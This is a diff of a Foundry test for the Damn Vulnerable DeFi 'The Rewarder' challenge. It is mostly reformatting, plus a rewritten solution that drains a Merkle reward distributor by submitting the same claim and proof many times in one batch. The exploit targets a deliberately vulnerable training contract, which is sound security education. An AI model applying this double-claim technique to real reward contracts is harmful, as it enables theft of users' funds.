@@ -5,12 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {Merkle} from "murky/Merkle.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
-import {
-    TheRewarderDistributor,
-    IERC20,
-    Distribution,
-    Claim
-} from "../../src/the-rewarder/TheRewarderDistributor.sol";
+import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
 contract TheRewarderChallenge is Test {
@@ -59,12 +54,8 @@ contract TheRewarderChallenge is Test {
         weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();
 
         // Calculate roots for DVT and WETH distributions
-        bytes32[] memory dvtLeaves = _loadRewards(
-            "/test/the-rewarder/dvt-distribution.json"
-        );
-        bytes32[] memory wethLeaves = _loadRewards(
-            "/test/the-rewarder/weth-distribution.json"
-        );
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         merkle = new Merkle();
         dvtRoot = merkle.getRoot(dvtLeaves);
         wethRoot = merkle.getRoot(wethLeaves);
@@ -116,17 +107,11 @@ contract TheRewarderChallenge is Test {
 
         // Alice claims once
         vm.startPrank(alice);
-        distributor.claimRewards({
-            inputClaims: claims,
-            inputTokens: tokensToClaim
-        });
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
 
         // Alice cannot claim twice
         vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
-        distributor.claimRewards({
-            inputClaims: claims,
-            inputTokens: tokensToClaim
-        });
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
         vm.stopPrank(); // stop alice prank
 
         vm.stopPrank(); // stop deployer prank
@@ -150,13 +135,11 @@ contract TheRewarderChallenge is Test {
         assertEq(weth.balanceOf(alice), ALICE_WETH_CLAIM_AMOUNT);
 
         // After Alice's claim, distributor still has enough tokens to distribute
-        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT -
-            ALICE_DVT_CLAIM_AMOUNT;
+        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
         assertEq(dvt.balanceOf(address(distributor)), expectedDVTLeft);
         assertEq(distributor.getRemaining(address(dvt)), expectedDVTLeft);
 
-        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT -
-            ALICE_WETH_CLAIM_AMOUNT;
+        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
         assertEq(weth.balanceOf(address(distributor)), expectedWETHLeft);
         assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
     }
@@ -165,77 +148,62 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        string memory dvtDistributuion = vm.readFile(
-            "test/the-rewarder/dvt-distribution.json"
-        );
-        Reward[] memory dvtRewards = abi.decode(
-            vm.parseJson(dvtDistributuion),
-            (Reward[])
-        );
 
-        string memory wethDistribution = vm.readFile(
-            "test/the-rewarder/weth-distribution.json"
-        );
-        Reward[] memory wethRewards = abi.decode(
-            vm.parseJson(wethDistribution),
-            (Reward[])
-        );
-
-        bytes32[] memory dvtLeaves = _loadRewards(
-            "/test/the-rewarder/dvt-distribution.json"
-        );
-        bytes32[] memory wethLeaves = _loadRewards(
-            "/test/the-rewarder/weth-distribution.json"
-        );
-
-        uint256 dvtAmount;
-        bytes32[] memory dvtProof;
-        for (uint256 i = 0; i < dvtRewards.length; i++) {
+        // Read DVT distribution JSON
+        string memory dvtJson = vm.readFile("test/the-rewarder/dvt-distribution.json");
+        Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtJson), (Reward[]));
+        // Read WETH distribution
+        string memory wethJson = vm.readFile("test/the-rewarder/weth-distribution.json");
+        Reward[] memory wethRewards = abi.decode(vm.parseJson(wethJson), (Reward[]));
+        // Load leaves
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        
+        // Find player's reward amounts and leaves
+        uint256 playerDvtAmount;
+        bytes32[] memory playerDvtProof;
+        uint256 playerWethAmount;
+        bytes32[] memory playerWethProof;
+        for (uint i = 0; i < dvtRewards.length; i++) {
             if (dvtRewards[i].beneficiary == player) {
-                dvtAmount = dvtRewards[i].amount;
-                dvtProof = merkle.getProof(dvtLeaves, i);
+                playerDvtAmount = dvtRewards[i].amount;
+                playerWethAmount = wethRewards[i].amount;
+                playerDvtProof = merkle.getProof(dvtLeaves, i);
+                playerWethProof = merkle.getProof(wethLeaves, i);
                 break;
             }
         }
+        require(playerDvtAmount > 0, "Player not found in DVT distribution");
+        require(playerWethAmount > 0, "Player not found in WETH distribution");
 
-        uint256 wethAmount;
-        bytes32[] memory wethProof;
-        for (uint256 i = 0; i < wethRewards.length; i++) {
-            if (wethRewards[i].beneficiary == player) {
-                wethAmount = wethRewards[i].amount;
-                wethProof = merkle.getProof(wethLeaves, i);
-                break;
-            }
-        }
+        // Set up token claims
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
 
-        uint256 dvtClaimsNeeded = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtAmount;
-        uint256 wethClaimsNeeded = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethAmount;
-        uint256 totalClaimsNeeded = dvtClaimsNeeded + wethClaimsNeeded;
-
+        // Calculate number of claims needed based on the total distribution and player's amounts
+        uint256 totalClaimsNeeded = 
+            (TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount) +
+            (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
+        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
         Claim[] memory claims = new Claim[](totalClaimsNeeded);
+
+        // Set up all claims
+        // For example if totalClaimsNeeded = 100, and dvtClaims = 60, then wethClaims = 40
+        // Input claims for example = [DVT, DVT, DVT, DVT, WETH, WETH, WETH]
         for (uint256 i = 0; i < totalClaimsNeeded; i++) {
-            if (i < dvtClaimsNeeded) {
-                claims[i] = Claim({
-                    batchNumber: 0,
-                    amount: dvtAmount,
-                    tokenIndex: 0,
-                    proof: dvtProof
-                });
-            } else {
-                claims[i] = Claim({
-                    batchNumber: 0,
-                    amount: wethAmount,
-                    tokenIndex: 1,
-                    proof: wethProof
-                });
-            }
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
+                tokenIndex: i < dvtClaims ? 0 : 1,
+                proof: i < dvtClaims ? playerDvtProof : playerWethProof
+            });
         }
 
-        IERC20[] memory tokens = new IERC20[](2);
-        tokens[0] = IERC20(address(dvt));
-        tokens[1] = IERC20(address(weth));
-
-        distributor.claimRewards(claims, tokens);
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
 
         dvt.transfer(recovery, dvt.balanceOf(player));
         weth.transfer(recovery, weth.balanceOf(player));
@@ -246,30 +214,18 @@ contract TheRewarderChallenge is Test {
      */
     function _isSolved() private view {
         // Player saved as much funds as possible, perhaps leaving some dust
-        assertLt(
-            dvt.balanceOf(address(distributor)),
-            1e16,
-            "Too much DVT in distributor"
-        );
-        assertLt(
-            weth.balanceOf(address(distributor)),
-            1e15,
-            "Too much WETH in distributor"
-        );
+        assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
+        assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");
 
         // All funds sent to the designated recovery account
         assertEq(
             dvt.balanceOf(recovery),
-            TOTAL_DVT_DISTRIBUTION_AMOUNT -
-                ALICE_DVT_CLAIM_AMOUNT -
-                dvt.balanceOf(address(distributor)),
+            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
             "Not enough DVT in recovery account"
         );
         assertEq(
             weth.balanceOf(recovery),
-            TOTAL_WETH_DISTRIBUTION_AMOUNT -
-                ALICE_WETH_CLAIM_AMOUNT -
-                weth.balanceOf(address(distributor)),
+            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
             "Not enough WETH in recovery account"
         );
     }
@@ -280,20 +236,14 @@ contract TheRewarderChallenge is Test {
     }
 
     // Utility function to read rewards file and load it into an array of leaves
-    function _loadRewards(
-        string memory path
-    ) private view returns (bytes32[] memory leaves) {
-        Reward[] memory rewards = abi.decode(
-            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))),
-            (Reward[])
-        );
+    function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
+        Reward[] memory rewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
 
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
-            leaves[i] = keccak256(
-                abi.encodePacked(rewards[i].beneficiary, rewards[i].amount)
-            );
+            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
         }
     }
 }
